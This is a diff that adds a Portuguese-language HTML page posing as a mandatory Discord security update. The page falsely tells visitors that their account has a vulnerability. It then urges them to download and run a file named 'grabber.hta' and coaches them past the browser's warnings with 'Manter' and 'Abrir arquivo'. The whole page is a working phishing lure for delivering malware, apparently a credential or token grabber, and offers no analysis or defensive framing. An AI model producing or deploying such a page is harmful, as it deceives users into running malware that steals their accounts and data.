@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atualização do Discord - Segurança</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .card h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
+        .card p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
+        .btn {
+            display: inline-block;
+            background: #5865F2;
+            color: white;
+            padding: 14px 40px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: background 0.3s;
+            cursor: pointer;
+        }
+        .btn:hover { background: #4752C4; }
+        .warning {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🔒 Atualização Obrigatória</h1>
+        <p>O Discord identificou uma vulnerabilidade de segurança na sua conta.<br>
+        Para continuar usando normalmente, clique no botão abaixo e execute o arquivo de atualização.</p>
+        
+        <a href="grabber.hta" class="btn" download>Baixar Atualização</a>
+        
+        <div class="warning">
+            Caso o navegador solicite confirmação, clique em "Manter" e depois "Abrir arquivo".
+        </div>
+    </div>
+</body>
+</html>
